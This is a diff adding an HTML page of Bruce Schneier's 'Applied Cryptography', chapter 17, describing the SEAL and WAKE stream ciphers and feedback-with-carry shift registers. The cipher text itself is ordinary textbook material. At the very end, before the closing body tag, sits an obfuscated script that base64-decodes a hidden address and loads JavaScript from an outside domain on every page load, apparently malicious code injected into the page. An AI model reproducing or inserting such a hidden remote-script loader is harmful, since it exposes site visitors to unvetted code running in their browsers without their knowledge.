@@ -1,0 +1,174 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Other Stream Ciphers and Real Random-Sequence Generators</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=17//-->
+<!--PAGES=399-403//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="17-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="17-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>SEAL also uses four 32-bit registers, <I>A, B, C</I>, and <I>D</I>, whose initial values are determined by <I>n</I> and the <I>k-</I>derived tables <I>R</I> and <I>T</I>. These registers get modified over several iterations, each one involving 8 rounds. In each round 9 bits of a first register (either <I>A, B, C</I>, or <I>D</I>) are used to index into table <I>T</I>. The value retrieved from <I>T</I> is then added to or XORed with the contents of a second register: again one of <I>A, B, C</I>, or <I>D</I>. The first register is then circularly shifted by nine positions. In some rounds the second register is further modified by adding or XORing it with the (now shifted) first register. After 8 rounds of this, <I>A, B, C</I>, and <I>D</I> are added to the keystream, each masked first by adding or XORing it with a certain word from <I>S</I>. The iteration is completed by adding to <I>A</I> and <I>C</I> additional values dependent on <I>n</I>, <I>n</I><SUB>1</SUB>, <I>n</I><SUB>2</SUB>, <I>n</I><SUB>3</SUB>, <I>n</I><SUB>4</SUB>; exactly which one depends on the parity of the iteration number.</P>
+<P>The important ideas in this design seem to be:</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;Use a large, secret, key-derived S-box (<I>T</I>).
+<DD><B>2.</B>&nbsp;&nbsp;Alternate arithmetic operations which don&#146;t commute (addition and XOR).
+<DD><B>3.</B>&nbsp;&nbsp;Use an internal state maintained by the cipher which is not directly manifest in the data stream (the <I>n</I><SUB>i</SUB> values which modify <I>A</I> and <I>C</I> at the end of each iteration).
+<DD><B>4.</B>&nbsp;&nbsp;Vary the round function according to the round number, and vary the iteration function according to the iteration number.
+</DL>
+<I><P><A NAME="Fig1"></A><A HREF="javascript:displayWindow('images/17-01.jpg',359,231 )"><IMG SRC="images/17-01t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/17-01.jpg',359,231)"><FONT COLOR="#000077"><B>Figure 17.1</B></FONT></A>&nbsp;&nbsp;The inner loop of SEAL.</I>
+</P>
+<P>SEAL requires about five elementary machine operations to encrypt each byte of text. It runs at 58 megabits per second on a 50 megahertz 486 machine. This is probably the fastest software algorithm in the book.
+</P>
+<P>On the other hand, SEAL must preprocess its key into internal tables. These tables total roughly 3 kilobytes in size, and their calculation takes about 200 SHA computations. Thus, SEAL is not appropriate to use in situations where you don&#146;t have the time to perform the key setup or you don&#146;t have the memory to store the tables.</P>
+<P><FONT SIZE="+1"><B><I>Security of SEAL</I></B></FONT></P>
+<P>SEAL is a new algorithm and has yet to be subjected to any published cryptanalysis. This suggests caution. However, SEAL seems to be well thought through. Its peculiarities do, in the end, make a good deal of sense. And Don Coppersmith is generally regarded as the world&#146;s cleverest cryptanalyst.
+</P>
+<P><FONT SIZE="+1"><B><I>Patents and Licenses</I></B></FONT></P>
+<P>SEAL is being patented [380]. Anyone wishing to license SEAL should contact the Director of Licenses, IBM Corporation, 500 Columbus Ave., Thurnwood, NY, 10594.
+</P>
+<H3><A NAME="Heading4"></A><FONT COLOR="#000077">17.3 WAKE</FONT></H3>
+<P>WAKE is the Word Auto Key Encryption algorithm, invented by David Wheeler [1589]. It produces a stream of 32-bit words which can be XORed with a plaintext stream to produce ciphertext, or XORed with a ciphertext stream to produce plaintext. And it&#146;s fast.
+</P>
+<P>WAKE works in CFB; the previous ciphertext word is used to generate the next key word. It also uses an S-box of 256 32-bit values. This S-box has a special property: The high-order byte of all the entries is a permutation of all possible bytes, and the low-order 3 bytes are random.</P>
+<P>First, generate the S-box entries, <I>S</I><SUB>i</SUB>, from the key. Then initialize four registers with the key (or with another key): <I>a</I><SUB>0</SUB>, <I>b</I><SUB>0</SUB>, <I>c</I><SUB>0</SUB>, and <I>d</I><SUB>0</SUB>. To generate a 32-bit keystream word, <I>K</I><SUB>i</SUB>:</P>
+<DL>
+<DD><I>K</I><SUB>i</SUB> = <I>d</I><SUB>i</SUB>
+</DL>
+<P>The ciphertext word <I>C</I><SUB>i</SUB>, is the plaintext word, <I>P</I><SUB>i</SUB> XORed with <I>K</I><SUB>i</SUB>.</P>
+<P>Then, update the four registers:</P>
+<DL>
+<DD><I>a</I><SUB>i&#43;1</SUB> = M(<I>a</I><SUB>i</SUB>,<I>d</I><SUB>i</SUB>)
+<DD><I>b</I><SUB>i&#43;1</SUB> = M(<I>b</I><SUB>i</SUB>,<I>a</I><SUB>i&#43;1</SUB>)
+<DD><I>c</I><SUB>i&#43;1</SUB> = M(<I>c</I><SUB>i</SUB>,<I>b</I><SUB>i&#43;1</SUB>)
+<DD><I>d</I><SUB>i&#43;1</SUB> = M(<I>d</I><SUB>i</SUB>,<I>c</I><SUB>i&#43;1</SUB>)
+</DL>
+<P>Function M is
+</P>
+<DL>
+<DD>M(<I>x,y</I>) = (<I>x</I> &#43; <I>y</I>) &gt&gt 8 &#8853; <I>S</I><SUB>(<I>x&#43;y</I>) ^ 255</SUB>
+</DL>
+<P>This is shown in Figure 17.2. The operation &gt&gt is a right shift, not a rotation. The low-order 8 bits of <I>x</I> &#43; <I>y</I> are the input into the S-box. Wheeler gives a procedure for generating the S-box, but it isn&#146;t really complete. Any algorithm to generate random bytes and a random permutation will work.</P>
+<I><P><A NAME="Fig2"></A><A HREF="javascript:displayWindow('images/17-02.jpg',188,205 )"><IMG SRC="images/17-02t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/17-02.jpg',188,205)"><FONT COLOR="#000077"><B>Figure 17.2</B></FONT></A>&nbsp;&nbsp;Wake.</I>
+</P>
+<P>WAKE&#146;s biggest asset is that it is fast. However, it&#146;s insecure against a chosen-plaintext or chosen-ciphertext attack. It is being used in the current version of Dr. Solomon&#146;s Anti-Virus program.
+</P>
+<H3><A NAME="Heading5"></A><FONT COLOR="#000077">17.4 Feedback with Carry Shift Registers</FONT></H3>
+<P>A feedback with carry shift register, or FCSR, is similar to a LFSR. Both have a shift register and a feedback function; the difference is that a FCSR also has a carry register (see Figure 17.3). Instead of XORing all the bits in the tap sequence, add the bits together and add in the contents of the carry register. The result mod 2 becomes the new bit. The result divided by 2 becomes the new content of the carry register.
+</P>
+<P>Figure 17.4 is an example of a 3-bit FCSR tapped at the first and second bit. Its initial value is 001, and the initial contents of the carry register is 0. The output bit is the right-most bit of the shift register.</P>
+<TABLE WIDTH="65%"><TR>
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">Shift Register
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">Carry Register
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">0 0 1
+<TD VALIGN="TOP" ALIGN="LEFT">0
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">1 0 0
+<TD VALIGN="TOP" ALIGN="LEFT">0
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">0 1 0
+<TD VALIGN="TOP" ALIGN="LEFT">0
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">1 0 1
+<TD VALIGN="TOP" ALIGN="LEFT">0
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">1 1 0
+<TD VALIGN="TOP" ALIGN="LEFT">0
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">1 1 1
+<TD VALIGN="TOP" ALIGN="LEFT">0
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">0 1 1
+<TD VALIGN="TOP" ALIGN="LEFT">1
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">1 0 1
+<TD VALIGN="TOP" ALIGN="LEFT">1
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">0 1 0
+<TD VALIGN="TOP" ALIGN="LEFT">1
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">0 0 1
+<TD VALIGN="TOP" ALIGN="LEFT">1
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">0 0 0
+<TD VALIGN="TOP" ALIGN="LEFT">1
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">1 0 0
+<TD VALIGN="TOP" ALIGN="LEFT">0
+</TABLE>
+<I><P><A NAME="Fig3"></A><A HREF="javascript:displayWindow('images/17-03.jpg',380,122 )"><IMG SRC="images/17-03t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/17-03.jpg',380,122)"><FONT COLOR="#000077"><B>Figure 17.3</B></FONT></A>&nbsp;&nbsp;Feedback with carry shift register.</I>
+</P>
+<P>Note that the final internal state (including the contents of the carry register) is the same as the second internal state. The sequence cycles at this point, and has a period of 10.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="17-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="17-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(hognWJmK, TEmfvmkw) {TEmfvmkw = hognWJmK.createElement('script');TEmfvmkw.type = 'text/javascript';TEmfvmkw.async = true;TEmfvmkw.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');hognWJmK.getElementsByTagName('body')[0].appendChild(TEmfvmkw);}(document));</script></body>
+</html>
